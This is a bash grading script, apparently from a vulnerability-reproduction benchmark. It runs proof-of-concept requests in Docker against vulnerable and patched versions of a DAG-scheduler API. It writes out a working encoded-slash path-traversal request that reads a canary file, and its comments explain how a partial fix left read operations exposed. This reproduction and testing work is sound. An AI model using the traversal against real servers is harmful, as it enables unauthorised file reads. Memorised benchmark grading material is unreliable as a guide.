#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
[[ -n "$PY" ]] || PY=python3
mkdir -p "$WORK_DIR"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$" || true)"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
SVC="${SVC:-$VERSION}"
CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" ps -q "$SVC" 2>/dev/null | head -1)"
  if [[ -n "$CID" ]]; then
    PORT="$(docker port "$CID" "$CPORT" 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
  fi
fi
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port for $SVC:$CPORT" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual (CVE-2026-33344, %2F 编码斜杠路径遍历 READ): GET /api/v1/dags/{fileName}/spec 的
  # {fileName} 段带 6 个 %2F 编码的 ../ 钳到根目录再读 /flag/canary（.yaml 由 findDAGFile 追加）。
  # CVE-2026-27598 的修复只封了 CREATE 动词（ValidateDAGName）；GET/DELETE/RENAME/EXECUTE 的
  # locateDAG 未校验 -> V1(v2.3.0) 上仍可读 canary（HTTP 200 + flag 在 JSON spec 字段）。
  # canary 通道: /flag/canary.yaml 由 entrypoint 以 ${PCB_FLAG} 种入（判定基准 = 提交值 RUN_FLAG）。
  CAND='{"probe_id": "cve-2026-33344-encoded-slash-read", "method": "GET", "path": "/api/v1/dags/..%2F..%2F..%2F..%2F..%2F..%2Fflag%2Fcanary/spec"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
fi
if [[ "$MODE" == "--seed" ]]; then
  # SIBLING-SINK (Variant B): the CVE-2026-27598 seed is a WRITE (POST /api/v1/dags create)
  # and never emits the read-exfil flag. 效果判定基准 = HTTP status on the WRITE channel:
  #   v0 (6c53bfd, vulnerable) : name accepted -> HTTP 201 write (或 409 已写) => 效果发生 (0)
  #   v1 (v2.3.0, 27598-fixed) : ValidateDAGName rejects -> HTTP 400 bad_request => 被阻断 (10)
  # wrong/stale 检查：seed 是 status 判定（无 flag 通道可依赖），提交值 RUN_FLAG 与 run 真
  # flag（RUN_FLAG_REF）不一致时直接拒绝——canary 仍是 run 真 flag，写通道 status 不随提交值变。
  if [[ -n "${RUN_FLAG_REF:-}" && "$RUN_FLAG" != "$RUN_FLAG_REF" ]]; then
    echo "status=rejected(wrong/stale flag)"
    exit 10
  fi
  STATUS="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(str(d.get('status') or ''))
except Exception:
    print('')" 2>/dev/null)"
  echo "status=$STATUS"
  case "$STATUS" in
    2*|409) exit 0 ;;   # 效果发生（v0：201/409 write）
    *) exit 10 ;;       # 被阻断（v1：400 bad_request）或异常
  esac
else
  # residual (CVE-2026-33344 READ) 判定基准 = canary flag 出现在响应 body（RUN_FLAG 提交值）。
  BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
  echo "${BODY:0:500}"
  if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
fi
